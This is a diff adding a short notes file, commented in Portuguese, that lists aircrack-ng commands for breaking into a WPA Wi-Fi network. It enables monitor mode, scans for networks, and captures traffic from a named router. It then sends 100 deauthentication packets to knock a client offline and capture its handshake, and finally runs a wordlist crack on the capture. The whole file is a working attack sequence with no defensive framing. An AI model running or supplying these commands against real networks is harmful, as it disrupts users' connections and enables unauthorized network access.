@@ -1,0 +1,18 @@
+# colocar placa em monitoramento
+airmon-ng start wlan0
+
+# monitorar redes wifi disponiveis
+airodump-ng mon0
+
+# monitorar rede especifica e gravar becames em arquivos wifi
+airodump-ng --bssid 00:1F:A4:F4:EB:40 --channel 6 --write wifi mon0
+
+# injecao de pacotes para gerar trafego
+# -a mac do roteador
+# -c mac aleatorio para injecao
+# -0 metodo de desautenticacao
+# -100 quantidade de vezes
+aireplay-ng -0 100 -a 00:1F:A4:F4:EB:40 -c 40:2C:F4:34:00:56 mon0
+
+# tentativa de crack
+aircrack-ng wifi-01.cap -w /root/master.lst
